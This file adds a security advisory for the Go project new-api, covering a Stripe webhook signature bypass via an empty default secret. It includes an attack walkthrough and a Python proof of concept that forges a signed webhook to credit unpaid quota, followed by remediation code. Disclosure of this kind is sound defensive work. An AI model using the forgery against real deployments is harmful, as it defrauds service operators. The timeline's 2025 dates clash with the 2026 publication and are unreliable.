@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-xff3-5c9p-2mr4",
+  "modified": "2026-04-24T16:11:43.074678Z",
+  "published": "2026-04-24T15:43:25Z",
+  "aliases": [
+    "CVE-2026-41432"
+  ],
+  "summary": "New API: Stripe Webhook Signature Bypass via Empty Secret Enables Unlimited Quota Fraud",
+  "details": "## Summary\n\nA critical vulnerability exists in the Stripe webhook handler that allows an **unauthenticated attacker to forge webhook events** and credit arbitrary quota to their account without making any payment. The vulnerability stems from three compounding flaws:\n\n1. The Stripe webhook endpoint does not reject requests when `StripeWebhookSecret` is empty (the default).\n2. When the HMAC secret is empty, any attacker can compute valid webhook signatures, effectively **bypassing signature verification entirely**.\n3. The `Recharge` function does not validate that the order's `PaymentMethod` matches the callback source, enabling **cross-gateway exploitation** — an order created via any payment method (e.g., Epay) can be fulfilled through a forged Stripe webhook.\n\n## Affected Components\n\n- `controller/topup_stripe.go` — `StripeWebhook()`, `sessionCompleted()`\n- `model/topup.go` — `Recharge()`, `RechargeCreem()`, `RechargeWaffo()`\n- `controller/topup.go` — `EpayNotify()`\n- `controller/topup_creem.go` — `CreemAdaptor.RequestPay()` (missing `PaymentMethod` field)\n- `router/api-router.go` — webhook route registered without any guard\n\n## CWE Classification\n\n- **CWE-345**: Insufficient Verification of Data Authenticity\n- **CWE-1188**: Initialization with an Insecure Default (empty webhook secret)\n- **CWE-863**: Incorrect Authorization (cross-gateway order fulfillment)\n\n## Vulnerability Details\n\n### Flaw 1: Empty Webhook Secret Bypasses Signature Verification\n\nThe `StripeWebhookSecret` setting defaults to an empty string `\"\"`. The Stripe Go SDK (`webhook.ConstructEventWithOptions`) does **not** reject empty secrets — it computes `HMAC-SHA256` with an empty key, producing a deterministic and publicly computable signature.\n\n**Vulnerable code** (`controller/topup_stripe.go`):\n```go\nfunc StripeWebhook(c *gin.Context) {\n    // No check for empty StripeWebhookSecret\n    payload, _ := io.ReadAll(c.Request.Body)\n    signature := c.GetHeader(\"Stripe-Signature\")\n    endpointSecret := setting.StripeWebhookSecret // defaults to \"\"\n    event, err := webhook.ConstructEventWithOptions(payload, signature, endpointSecret, ...)\n    // When secret is \"\", attacker can compute valid HMAC with the same empty key\n}\n```\n\nThe webhook route is unconditionally registered with **no authentication middleware and no rate limiting**:\n```go\napiRouter.POST(\"/stripe/webhook\", controller.StripeWebhook)\n```\n\n### Flaw 2: Missing `payment_status` Verification\n\nThe `sessionCompleted` handler only checks `status == \"complete\"` but does **not** verify `payment_status == \"paid\"`. Stripe's `checkout.session.completed` event can fire with `payment_status = \"unpaid\"` for delayed payment methods (bank transfer, SEPA, Boleto, etc.) or `payment_status = \"no_payment_required\"` for 100% discount coupons.\n\nAdditionally, `checkout.session.async_payment_succeeded` and `checkout.session.async_payment_failed` events are not handled, so delayed payments that ultimately fail are never rolled back.\n\n### Flaw 3: Cross-Gateway Order Fulfillment (No PaymentMethod Validation)\n\nThe `model.Recharge()` function (called by the Stripe webhook) looks up orders solely by `trade_no` and does **not** validate that the order's `PaymentMethod` is `\"stripe\"`:\n\n```go\nfunc Recharge(referenceId string, customerId string) (err error) {\n    // Finds ANY pending order by trade_no, regardless of PaymentMethod\n    tx.Where(\"trade_no = ?\", referenceId).First(topUp)\n    if topUp.Status != \"pending\" { return }\n    // Credits quota without checking topUp.PaymentMethod\n    quota = topUp.Money * QuotaPerUnit\n    tx.Model(\u0026User{}).Update(\"quota\", gorm.Expr(\"quota + ?\", quota))\n}\n```\n\nThis allows an attacker to create orders through **any** configured payment gateway (Epay, Creem, Waffo) and then complete them via a forged Stripe webhook — even if Stripe itself was never configured.\n\n## Attack Scenario\n\n**Prerequisites**: Any payment method is configured (e.g., Epay) + `StripeWebhookSecret` is empty (default).\n\n1. Attacker registers a user account.\n2. Attacker calls `POST /api/user/pay` to create an Epay top-up order (e.g., `amount=10000`). The order is stored with `status=pending`.\n3. Attacker queries `GET /api/user/topup/self` to retrieve the `trade_no` of the pending order.\n4. Attacker computes `HMAC-SHA256` with an empty key over a crafted `checkout.session.completed` payload containing the stolen `trade_no` as `client_reference_id`.\n5. Attacker sends `POST /api/stripe/webhook` with the forged payload and signature header.\n6. The server verifies the signature (passes because the secret is empty), calls `Recharge()`, which finds the Epay order by `trade_no`, marks it as `success`, and credits the full quota.\n7. Attacker repeats steps 2–6 indefinitely for unlimited credits.\n\n**Proof of concept** (pseudocode):\n```python\nimport hmac, hashlib, time, json, requests\n\ntimestamp = int(time.time())\npayload = json.dumps({\n    \"type\": \"checkout.session.completed\",\n    \"data\": {\n        \"object\": {\n            \"client_reference_id\": \"\u003ctrade_no from step 3\u003e\",\n            \"status\": \"complete\",\n            \"payment_status\": \"paid\",\n            \"customer\": \"cus_fake\",\n            \"amount_total\": \"0\",\n            \"currency\": \"usd\"\n        }\n    }\n})\n# Empty secret = publicly computable signature\nsig = hmac.new(b\"\", f\"{timestamp}.{payload}\".encode(), hashlib.sha256).hexdigest()\nheader = f\"t={timestamp},v1={sig}\"\n\nrequests.post(\"https://target/api/stripe/webhook\",\n    data=payload,\n    headers={\"Stripe-Signature\": header, \"Content-Type\": \"application/json\"})\n```\n\n## Remediation\n\n### Fix 1: Reject webhooks when secret is empty\n```go\nfunc StripeWebhook(c *gin.Context) {\n    if setting.StripeWebhookSecret == \"\" {\n        c.AbortWithStatus(http.StatusForbidden)\n        return\n    }\n    // ... existing logic\n}\n```\n\n### Fix 2: Verify `payment_status` and handle async payment events\n```go\nfunc sessionCompleted(event stripe.Event) {\n    // ... existing status check ...\n    paymentStatus := event.GetObjectValue(\"payment_status\")\n    if paymentStatus != \"paid\" {\n        return // Wait for async_payment_succeeded event\n    }\n    fulfillOrder(event, referenceId, customerId)\n}\n```\n\nAdd handlers for `checkout.session.async_payment_succeeded` and `checkout.session.async_payment_failed`.\n\n### Fix 3: Validate PaymentMethod in all recharge functions\n```go\n// In model.Recharge (Stripe):\nif topUp.PaymentMethod != \"stripe\" {\n    return ErrPaymentMethodMismatch\n}\n\n// In model.RechargeCreem:\nif topUp.PaymentMethod != \"creem\" {\n    return ErrPaymentMethodMismatch\n}\n\n// In model.RechargeWaffo:\nif topUp.PaymentMethod != \"waffo\" {\n    return ErrPaymentMethodMismatch\n}\n\n// In controller.EpayNotify:\nif topUp.PaymentMethod == \"stripe\" || topUp.PaymentMethod == \"creem\" || topUp.PaymentMethod == \"waffo\" {\n    return // reject cross-gateway fulfillment\n}\n```\n\n### Additional fix: Set PaymentMethod on Creem order creation\nThe Creem order creation was missing the `PaymentMethod` field entirely:\n```go\ntopUp := \u0026model.TopUp{\n    // ...\n    PaymentMethod: \"creem\", // was missing\n}\n```\n\n## Patched Versions\n\n- **v0.12.10** — includes all three fixes described above.\n\nAll users are strongly encouraged to upgrade immediately.\n\n## Workaround (for users unable to upgrade immediately)\n\nIf users cannot upgrade to v0.12.10 right away, apply **all** of the following mitigations:\n\n1. **Set `StripeWebhookSecret` to any non-empty value.** Go to the admin panel → Payment → Stripe, and set the Webhook Signing Secret to **any random string** (e.g., `whsec_placeholder_do_not_leave_empty`). It does **not** need to be a real Stripe secret — any non-empty value will prevent the empty-key HMAC forgery. **This is the single most important step** — it closes the primary attack vector. If Stripe payments are used in production, replace with the real secret from the project's [Stripe Dashboard → Webhooks](https://dashboard.stripe.com/webhooks) to ensure legitimate webhooks continue to work.\n\n2. **If Stripe is not in use, block the webhook endpoint.** If users have not configured Stripe payments, use a reverse proxy (Nginx, Caddy, etc.) to deny access to `/api/stripe/webhook`:\n   ```nginx\n   location = /api/stripe/webhook {\n       return 403;\n   }\n   ```\n\n\u003e **Note**: The workaround only mitigates Flaw 1 (empty secret bypass). Flaws 2 (missing `payment_status` check) and 3 (cross-gateway fulfillment) are only fully addressed in v0.12.10. **Upgrading is the only complete fix.**\n\n## Impact\n\n- **Financial fraud**: Attacker obtains unlimited API quota without payment.\n- **Operator financial loss**: Fraudulent quota is consumed against upstream AI providers (OpenAI, Anthropic, Google, etc.), charged to the operator.\n- **Silent exploitation**: Fraudulent top-ups appear as normal successful transactions in system logs, making detection difficult.\n- **Wide exposure**: The default insecure configuration means virtually all deployments with any payment method enabled are vulnerable.\n\n## Timeline\n\n- **2025-04-15**: Vulnerability reported by [@ChangeYu0229](https://github.com/ChangeYu0229)\n- **2025-04-15**: Vulnerability confirmed and root cause analysis completed\n- **2025-04-15**: Fix developed and applied\n- **2025-04-15**: Patched in v0.12.10\n\n## Resources\n\n- [Stripe Webhook Signature Verification Docs](https://docs.stripe.com/webhooks#verify-official-libraries)\n- [Stripe Checkout Fulfillment Guide — Handle async payment methods](https://docs.stripe.com/checkout/fulfillment#async-payment-methods)\n- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)\n- [CWE-1188: Initialization with an Insecure Default](https://cwe.mitre.org/data/definitions/1188.html)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/QuantumNous/new-api",
+        "purl": "pkg:golang/github.com/QuantumNous/new-api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.12.10"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xff3-5c9p-2mr4/GHSA-xff3-5c9p-2mr4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/QuantumNous/new-api/security/advisories/GHSA-xff3-5c9p-2mr4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://docs.stripe.com/checkout/fulfillment#async-payment-methods"
+    },
+    {
+      "type": "WEB",
+      "url": "https://docs.stripe.com/webhooks#verify-official-libraries"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/QuantumNous/new-api"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/QuantumNous/new-api/releases/tag/v0.12.10"
+    }
+  ]
+}
